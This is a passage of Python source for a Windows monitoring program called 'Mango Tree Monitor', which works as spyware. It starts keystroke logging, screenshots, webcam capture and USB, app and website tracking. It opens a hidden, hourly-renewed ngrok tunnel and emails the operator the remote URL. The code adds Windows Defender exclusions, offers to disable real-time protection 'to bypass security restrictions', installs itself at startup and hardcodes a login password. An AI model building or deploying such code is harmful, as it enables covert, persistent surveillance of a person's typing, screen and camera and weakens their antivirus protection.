                    if filename.endswith(('.jpg', '.png')):
                        source_path = os.path.join(webcam_source, filename)
                        static_path = os.path.join(webcam_static, filename)
                        if not os.path.exists(static_path):
                            shutil.copy2(source_path, static_path)
        except Exception as e:
            print(f"Warning: Could not copy images to static directory: {e}")
        
        return True
    except Exception as e:
        print(f"Error creating monitoring files: {str(e)}")
        return False

def setup_ngrok(config):
    """Setup ngrok tunnel with robust error handling and health monitoring"""
    
    try:
        # Check if ngrok token exists
        ngrok_token = config.get('ngrok_token')
        
        if not ngrok_token:
            print("\n🔑 Ngrok token not found")
            print("You can get your token from https://dashboard.ngrok.com/get-started/your-authtoken")
            ngrok_token = input("Enter your ngrok token (or press Enter to skip): ").strip()
            
            if ngrok_token:
                config['ngrok_token'] = ngrok_token
                save_config(config)
                print("✓ Ngrok token saved")
            else:
                print("⚠️ Skipping remote access setup")
                return None

        # Download ngrok.exe if not present
        ngrok_path = os.path.join(os.getcwd(), 'ngrok.exe')
        if not os.path.exists(ngrok_path):
            print("📥 Downloading ngrok...")
            try:
                # Try multiple download sources to bypass security restrictions
                download_urls = [
                    "https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-windows-amd64.zip",
                    "https://github.com/ngrok/ngrok/releases/download/v3.5.0/ngrok-v3.5.0-windows-amd64.zip",
                    "https://github.com/ngrok/ngrok/releases/download/v3.4.1/ngrok-v3.4.1-windows-amd64.zip"
                ]
                
                zip_path = os.path.join(os.getcwd(), 'ngrok.zip')
                download_success = False
                
                for url in download_urls:
                    try:
                        print(f"  Trying download from: {url}")
                        urllib.request.urlretrieve(url, zip_path)
                        download_success = True
                        print("  Download successful!")
                        break
                    except Exception as e:
                        print(f"  Failed from this source: {str(e)}")
                        continue
                
                if not download_success:
                    print("✗ All download sources failed")
                    return None
                
                print("  Extracting ngrok...")
                with zipfile.ZipFile(zip_path, 'r') as zip_ref:
                    zip_ref.extractall(os.getcwd())
                
                os.remove(zip_path)
                print("✓ ngrok downloaded and extracted successfully")
                
                # Try to add Windows Defender exclusion (requires admin)
                try:
                    subprocess.run([
                        'powershell', '-Command', 
                        f'Add-MpPreference -ExclusionPath "{os.path.abspath(ngrok_path)}"'
                    ], capture_output=True, check=False)
                    print("✓ Added ngrok to Windows Defender exclusions")
                except:
                    print("⚠️ Could not add Windows Defender exclusion (run as admin)")
                    
            except Exception as e:
                print(f"✗ Failed to download ngrok: {str(e)}")
                return None
        else:
            print("✓ ngrok.exe already exists")

        # Set ngrok authtoken
        print("🔐 Configuring ngrok with provided token...")
        try:
            result = subprocess.run([ngrok_path, 'config', 'add-authtoken', ngrok_token], 
                                  capture_output=True, text=True, check=True)
            print("✓ Ngrok token configured successfully")
        except subprocess.CalledProcessError as e:
            print(f"⚠️ Could not configure ngrok token: {e.stderr}")
            print("  Continuing anyway...")

        # Kill any existing ngrok processes
        try:
            subprocess.run(['taskkill', '/f', '/im', 'ngrok.exe'], 
                         capture_output=True, check=False)
            time.sleep(2)
        except:
            pass
        
        # Start ngrok with improved configuration
        port = str(config['port'])
        print(f"🚀 Starting ngrok tunnel on port {port}...")
        
        # Use improved ngrok startup with better process management
        try:
            # Start ngrok directly with proper flags to hide window
            creationflags = subprocess.CREATE_NO_WINDOW | subprocess.DETACHED_PROCESS
            ngrok_proc = subprocess.Popen([
                ngrok_path, 'http', port, 
                '--log=stdout', 
                '--log-format=json',
                '--region=us'
            ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, 
               creationflags=creationflags)
            
            print("✓ Ngrok started successfully")
            
            # Wait for ngrok to start and get URL
            print("  Waiting for ngrok to start...")
            time.sleep(5)  # Give ngrok time to start
            
            # Try to get URL from ngrok API
            public_url = None
            max_attempts = 30
            
            for attempt in range(max_attempts):
                try:
                    response = requests.get('http://localhost:4040/api/tunnels', timeout=5)
                    if response.status_code == 200:
                        tunnels = response.json()
                        if tunnels and 'tunnels' in tunnels and tunnels['tunnels']:
                            public_url = tunnels['tunnels'][0]['public_url']
                            print(f"✓ Got URL from ngrok API: {public_url}")
                            break
                except:
                    pass
                
                if attempt < max_attempts - 1:
                    time.sleep(2)
                    if attempt % 5 == 0:
                        print(f"  Still waiting... ({attempt+1}/{max_attempts})")
            
            if not public_url:
                print("✗ Failed to get ngrok public URL")
                return None
            
            print(f"✅ Ngrok tunnel established successfully!")
            print(f"   Public URL: {public_url}")
            
            # Return a tunnel object with health monitoring
            class Tunnel:
                def __init__(self, url, proc, ngrok_path, port):
                    self.public_url = url
                    self.proc = proc
                    self.ngrok_path = ngrok_path
                    self.port = port
                    self.last_health_check = time.time()
                    self.health_check_interval = 30  # Check every 30 seconds
                
                def is_healthy(self):
                    """Check if ngrok tunnel is still working"""
                    try:
                        current_time = time.time()
                        if current_time - self.last_health_check < self.health_check_interval:
                            return True
                        
                        self.last_health_check = current_time
                        
                        # Check if process is still running
                        if self.proc.poll() is not None:
                            print("⚠️ Ngrok process has stopped")
                            return False
                        
                        # Check if tunnel is still accessible
                        try:
                            response = requests.get('http://localhost:4040/api/tunnels', timeout=10)
                            if response.status_code == 200:
                                tunnels = response.json()
                                if tunnels and 'tunnels' in tunnels and tunnels['tunnels']:
                                    # Verify the tunnel is actually working by testing the public URL
                                    tunnel_url = tunnels['tunnels'][0]['public_url']
                                    if tunnel_url != self.public_url:
                                        print(f"⚠️ Ngrok URL changed from {self.public_url} to {tunnel_url}")
                                        self.public_url = tunnel_url
                                    
                                    # Test if the tunnel is actually accessible
                                    try:
                                        test_response = requests.get(f"{tunnel_url}/", timeout=5)
                                        if test_response.status_code in [200, 401, 403]:  # Any response means tunnel is working
                                            return True
                                    except:
                                        pass
                        except:
                            pass
                        
                        print("⚠️ Ngrok tunnel appears to be down")
                        return False
                        
                    except Exception as e:
                        print(f"⚠️ Health check error: {str(e)}")
                        return False
                
                def restart(self):
                    """Restart the ngrok tunnel"""
                    try:
                        print("🔄 Restarting ngrok tunnel...")
                        
                        # Kill existing process
                        if self.proc:
                            try:
                                self.proc.terminate()
                                time.sleep(3)
                                # Force kill if still running
                                if self.proc.poll() is None:
                                    self.proc.kill()
                                    time.sleep(2)
                            except:
                                pass
                        
                        # Kill any remaining ngrok processes
                        try:
                            subprocess.run(['taskkill', '/f', '/im', 'ngrok.exe'], 
                                         capture_output=True, check=False)
                            time.sleep(2)
                        except:
                            pass
                        
                        # Start new process
                        creationflags = subprocess.CREATE_NO_WINDOW | subprocess.DETACHED_PROCESS
                        self.proc = subprocess.Popen([
                            self.ngrok_path, 'http', str(self.port), 
                            '--log=stdout', 
                            '--log-format=json',
                            '--region=us'
                        ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, 
                           creationflags=creationflags)
                        
                        # Wait longer for restart and get new URL
                        time.sleep(8)  # Increased wait time
                        
                        # Try multiple times to get new URL
                        max_attempts = 15
                        for attempt in range(max_attempts):
                            try:
                                response = requests.get('http://localhost:4040/api/tunnels', timeout=5)
                                if response.status_code == 200:
                                    tunnels = response.json()
                                    if tunnels and 'tunnels' in tunnels and tunnels['tunnels']:
                                        new_url = tunnels['tunnels'][0]['public_url']
                                        if new_url != self.public_url:  # Ensure it's a new URL
                                            self.public_url = new_url
                                            print(f"✓ Ngrok restarted successfully with new URL: {self.public_url}")
                                            return True
                            except:
                                pass
                            
                            if attempt < max_attempts - 1:
                                time.sleep(2)
                        
                        print("✗ Failed to restart ngrok or get new URL")
                        return False
                        
                    except Exception as e:
                        print(f"✗ Error restarting ngrok: {str(e)}")
                        return False
                
                def cleanup(self):
                    """Clean up ngrok resources"""
                    try:
                        if self.proc:
                            self.proc.terminate()
                    except:
                        pass
            
            return Tunnel(public_url, ngrok_proc, ngrok_path, port)
            
        except Exception as e:
            print(f"✗ Error starting ngrok: {str(e)}")
            return None
        
    except Exception as e:
        print(f"✗ Error setting up ngrok: {str(e)}")
        return None

def add_to_startup():
    """Add this EXE to Windows startup (user level)"""
    try:
        if getattr(sys, 'frozen', False):  # Only do this for PyInstaller EXE
            exe_path = sys.executable
            startup_dir = os.path.join(os.environ['APPDATA'], r'Microsoft\Windows\Start Menu\Programs\Startup')
            shortcut_path = os.path.join(startup_dir, 'MangoTreeMonitor.lnk')
            if not os.path.exists(shortcut_path):
                try:
                    import pythoncom
                    from win32com.shell import shell, shellcon
                    from win32com.client import Dispatch
                    shell = Dispatch('WScript.Shell')
                    shortcut = shell.CreateShortCut(shortcut_path)
                    shortcut.Targetpath = exe_path
                    shortcut.WorkingDirectory = os.path.dirname(exe_path)
                    shortcut.IconLocation = exe_path
                    shortcut.save()
                    print(f"✓ Added to startup: {shortcut_path}")
                except ImportError:
                    print("⚠️ win32com not available, skipping startup shortcut creation")
                except Exception as e:
                    print(f"Error creating startup shortcut: {str(e)}")
            else:
                print("Already in startup.")
    except Exception as e:
        print(f"Error adding to startup: {str(e)}")

def add_ngrok_exclusion_manual():
    """Provide instructions for manually adding ngrok to Windows Defender exclusions"""
    ngrok_path = os.path.abspath(os.path.join(os.getcwd(), 'ngrok.exe'))
    
    print("\n" + "="*60)
    print("🔧 MANUAL WINDOWS DEFENDER EXCLUSION SETUP")
    print("="*60)
    print("If ngrok is being blocked by Windows Defender, follow these steps:")
    print()
    print("1. Open Windows Security (Windows Defender)")
    print("2. Go to 'Virus & threat protection'")
    print("3. Click 'Manage settings' under 'Virus & threat protection settings'")
    print("4. Scroll down to 'Exclusions' and click 'Add or remove exclusions'")
    print("5. Click 'Add an exclusion' and select 'File'")
    print(f"6. Browse to and select: {ngrok_path}")
    print("7. Click 'Open' to add the exclusion")
    print("8. Restart this application")
    print()
    print("Alternative PowerShell command (run as Administrator):")
    print(f'Add-MpPreference -ExclusionPath "{ngrok_path}"')
    print()
    print("TEMPORARY DISABLE (Advanced users only):")
    print("Run PowerShell as Administrator and execute:")
    print("Set-MpPreference -DisableRealtimeMonitoring $true")
    print("(Remember to re-enable with: Set-MpPreference -DisableRealtimeMonitoring $false)")
    print("="*60)
    print()

def try_disable_defender_temporarily():
    """Try to temporarily disable Windows Defender real-time monitoring"""
    try:
        print("🛡️ Attempting to temporarily disable Windows Defender real-time monitoring...")
        result = subprocess.run([
            'powershell', '-Command', 
            'Set-MpPreference -DisableRealtimeMonitoring $true'
        ], capture_output=True, text=True, check=True)
        print("✓ Temporarily disabled Windows Defender real-time monitoring")
        return True
    except subprocess.CalledProcessError as e:
        print(f"✗ Failed to disable Windows Defender: {e.stderr}")
        print("  This requires Administrator privileges")
        return False
    except Exception as e:
        print(f"✗ Error: {str(e)}")
        return False

def re_enable_defender():
    """Re-enable Windows Defender real-time monitoring"""
    try:
        subprocess.run([
            'powershell', '-Command', 
            'Set-MpPreference -DisableRealtimeMonitoring $false'
        ], capture_output=True, text=True, check=False)
        print("✓ Re-enabled Windows Defender real-time monitoring")
    except:
        pass

def main():
    """Main function to start all monitoring components"""
    try:
        global live_monitor, audio_monitor, internet_monitor, screenshot_taker, webcam_capture
        global keystroke_logger, usb_monitor, app_tracker, activity_tracker, ngrok_tunnel, app_blocker
        
        print("\n" + "="*50)
        print("Starting Mango Tree Monitor")
        print("="*50)

        # Create necessary directories and log files
        try:
            ensure_log_directories()
            ensure_monitoring_files()
            print("✓ Created necessary directories and files")
        except Exception as e:
            print(f"✗ Failed to create directories: {str(e)}")
            return

        # Get user configuration
        config = get_user_config()
        if not config:
            print("✗ Setup cancelled or failed. Exiting...")
            return

        print("\n📋 Configuration loaded:")
        print(f"  Monitor Name: {config['username']}")
        print(f"  Port: {config['port']}")

        # Verify port is available
        if not test_port_available(config['port']):
            new_port = find_available_port(config['port'] + 1)
            if new_port:
                print(f"\n⚠️ Port {config['port']} is in use")
                print(f"  Switching to port {new_port}")
                config['port'] = new_port
                save_config(config)
            else:
                print("\n✗ No available ports found")
                print("  Please free up a port and try again")
                return

        # Add firewall rule
        try:
            if add_firewall_rule(config['port']):
                print("✓ Added firewall rule")
            else:
                print("⚠️ Failed to add firewall rule")
                print("  Monitor may not be accessible from other devices")
        except Exception as e:
            print(f"⚠️ Firewall error: {str(e)}")

        # Get local IP addresses
        local_ips = []
        try:
            for interface in netifaces.interfaces():
                addrs = netifaces.ifaddresses(interface)
                if netifaces.AF_INET in addrs:
                    for addr in addrs[netifaces.AF_INET]:
                        ip = addr['addr']
                        if not ip.startswith('127.'):
                            local_ips.append(ip)
            print("\n🌐 Network Addresses:")
            for ip in local_ips:
                print(f"  http://{ip}:{config['port']}")
        except Exception as e:
            print(f"⚠️ Error getting network addresses: {str(e)}")

        # Setup ngrok and get URL
        ngrok_tunnel = setup_ngrok(config)
        ngrok_url = ngrok_tunnel.public_url if ngrok_tunnel else None
        
        # Start ngrok health monitoring and hourly recreation if tunnel is available
        if ngrok_tunnel:
            def monitor_ngrok_health():
                last_hourly_recreation = time.time()
                while True:
                    try:
                        time.sleep(30)  # Check every 30 seconds
                        current_time = time.time()
                        
                        if ngrok_tunnel and hasattr(ngrok_tunnel, 'is_healthy'):
                            # Check if it's time for hourly recreation (every 3600 seconds = 1 hour)
                            if current_time - last_hourly_recreation >= 3600:
                                print("🕐 Hourly ngrok recreation time...")
                                if ngrok_tunnel.restart():
                                    print("✓ Ngrok tunnel recreated successfully")
                                    last_hourly_recreation = current_time
                                    # Send updated email with new URL
                                    send_monitor_email(config, ngrok_tunnel.public_url, local_ips)
                                else:
                                    print("✗ Failed to recreate ngrok tunnel")
                                    # Send email notification about failure
                                    send_ngrok_failure_email(config, local_ips)
                            
                            # Regular health check
                            elif not ngrok_tunnel.is_healthy():
                                print("⚠️ Ngrok tunnel unhealthy, attempting restart...")
                                if ngrok_tunnel.restart():
                                    print("✓ Ngrok tunnel restarted successfully")
                                    # Send updated email with new URL
                                    send_monitor_email(config, ngrok_tunnel.public_url, local_ips)
                                else:
                                    print("✗ Failed to restart ngrok tunnel")
                                    # Send email notification about failure
                                    send_ngrok_failure_email(config, local_ips)
                    except Exception as e:
                        print(f"Error in ngrok health monitoring: {str(e)}")
            
            health_thread = threading.Thread(target=monitor_ngrok_health, daemon=True)
            health_thread.start()
            print("✓ Ngrok health monitoring and hourly recreation started")
        
        # If ngrok setup failed, show manual exclusion instructions
        if not ngrok_tunnel:
            print("\n⚠️ Ngrok setup failed. This might be due to Windows Defender blocking it.")
            add_ngrok_exclusion_manual()
            
            print("\nOptions:")
            print("1. Try ngrok setup again")
            print("2. Try temporarily disabling Windows Defender (requires admin)")
            print("3. Continue without ngrok")
            
            choice = input("Enter your choice (1/2/3): ").strip()
            
            if choice == '1':
                print("Retrying ngrok setup...")
                ngrok_tunnel = setup_ngrok(config)
                ngrok_url = ngrok_tunnel.public_url if ngrok_tunnel else None
            elif choice == '2':
                if try_disable_defender_temporarily():
                    print("Retrying ngrok setup with Windows Defender disabled...")
                    ngrok_tunnel = setup_ngrok(config)
                    ngrok_url = ngrok_tunnel.public_url if ngrok_tunnel else None
                    
                    # Re-enable Windows Defender after a delay
                    def re_enable_later():
                        time.sleep(30)  # Wait 30 seconds
                        re_enable_defender()
                    
                    threading.Thread(target=re_enable_later, daemon=True).start()
                else:
                    print("Could not disable Windows Defender. Trying ngrok setup again...")
                    ngrok_tunnel = setup_ngrok(config)
                    ngrok_url = ngrok_tunnel.public_url if ngrok_tunnel else None
            else:
                print("Continuing without ngrok remote access...")

        # Send access details email
        if not send_monitor_email(config, ngrok_url, local_ips):
            response = input("Continue without sending email? (y/n): ")
            if response.lower() != 'y':
                return

        # Start continuous ngrok health monitoring thread (every 5 minutes)
        def ngrok_health_monitor():
            while True:
                time.sleep(5 * 60)  # 5 minutes
                
                if ngrok_tunnel:
                    if not ngrok_tunnel.is_healthy():
                        print("⚠️ Ngrok tunnel unhealthy, attempting restart...")
                        if ngrok_tunnel.restart():
                            print("✓ Ngrok tunnel restarted successfully")
                            # Send success email with new URL
                            send_monitor_email(config, ngrok_tunnel.public_url, local_ips)
                        else:
                            print("✗ Failed to restart ngrok tunnel")
                            # Send failure email
                            send_ngrok_failure_email(config, local_ips)
        
        # Start periodic email thread (every hour)
        def periodic_email():
            while True:
                time.sleep(60 * 60)  # 1 hour
                
                # Send regular email with current URL
                if ngrok_tunnel and ngrok_tunnel.is_healthy():
                    send_monitor_email(config, ngrok_tunnel.public_url, local_ips)
                else:
                    send_ngrok_failure_email(config, local_ips)
                    
        threading.Thread(target=ngrok_health_monitor, daemon=True).start()
        threading.Thread(target=periodic_email, daemon=True).start()

        # Add to startup if running as an EXE
        add_to_startup()

        print("\n🚀 Starting monitoring components...")

        # Start core monitoring components
        try:
            # Activity Tracker
            print("  Starting Activity Tracker...")
            activity_tracker = ActivityTracker()
            activity_tracker.start()
            print("    ✓ Activity Tracker started")

            # Website Tracker
            print("  Starting Website Tracker...")
            website_tracker = WebsiteTracker()
            website_tracker.start()
            print("    ✓ Website Tracker started")
        
            # Internet Monitor
            print("  Starting Internet Monitor...")
            internet_monitor = InternetMonitor()
            internet_monitor.start()
            print("    ✓ Internet Monitor started")

            # App Tracker
            print("  Starting App Tracker...")
            app_tracker = AppUsageTracker()
            app_tracker.start()
            print("    ✓ App Tracker started")
        
            # Keystroke Logger
            print("  Starting Keystroke Logger...")
            keystroke_logger = KeystrokeLoggerByApp()
            keystroke_logger.start()
            print("    ✓ Keystroke Logger started")

            # Screenshot Taker
            print("  Starting Screenshot Taker...")
            screenshot_taker = SmartScreenshotTaker()
            screenshot_thread = threading.Thread(target=screenshot_taker.start, daemon=True)
            screenshot_thread.start()
            print("    ✓ Screenshot Taker started")

            # USB Monitor
            print("  Starting USB Monitor...")
            usb_monitor = USBMonitorAdvanced()
            usb_monitor.start()
            print("    ✓ USB Monitor started")

            # Webcam Capture
            print("  Starting Webcam Capture...")
            webcam_capture = WebcamCapture()
            webcam_capture.start()
            print("    ✓ Webcam Capture started")

            # Live Monitor
            print("  Starting Live Monitor...")
            live_monitor = LiveMonitor()
            if live_monitor.start():
                print("    ✓ Live Monitor started")
            else:
                print("    ⚠️ Live Monitor failed to start")

            # Audio Monitor (Disabled)
            print("  Audio Monitor disabled")
            audio_monitor = None

            # Application Blocker
            print("  Starting Application Blocker...")
            app_blocker = ApplicationBlocker()
            app_blocker.start()
            print("    ✓ Application Blocker started")

        except Exception as e:
            print(f"\n✗ Failed to start components: {str(e)}")
            cleanup_and_exit()
            return

        # Start Flask server
        print("\n🌐 Starting web server...")
        try:
            flask_thread = threading.Thread(
                target=start_flask,
                args=('0.0.0.0', config['port']),
                daemon=True
            )
            flask_thread.start()
            print("✓ Web server started")
            
            # Print access information
            print("\n📱 Access Information:")
            print(f"  Local: http://localhost:{config['port']}")
            if ngrok_tunnel:
                print(f"  Remote: {ngrok_tunnel.public_url}")
            print("\n🔐 Login Information:")
            print("  Password: happykutta")
            
        except Exception as e:
            print(f"✗ Failed to start web server: {str(e)}")
            cleanup_and_exit()
            return

        print("\n✨ Monitor started successfully!")
        print("Press Ctrl+C to stop")
        
        # Keep the script running
        while True:
            time.sleep(60)
            
    except KeyboardInterrupt:
        print("\n\nShutting down gracefully...")
        cleanup_and_exit()
    except Exception as e:
        print(f"\n✗ Critical error: {str(e)}")
        cleanup_and_exit()

if __name__ == "__main__":
    try:
        # Set up signal handlers for graceful shutdown
        def signal_handler(signum, frame):
            logger.info("Received shutdown signal")
            cleanup_and_exit()
            
        signal.signal(signal.SIGINT, signal_handler)
        signal.signal(signal.SIGTERM, signal_handler)
        
        # Start the main application
        main() 
    except Exception as e:
        logger.error(f"Critical error in main execution: {str(e)}")
        cleanup_and_exit() 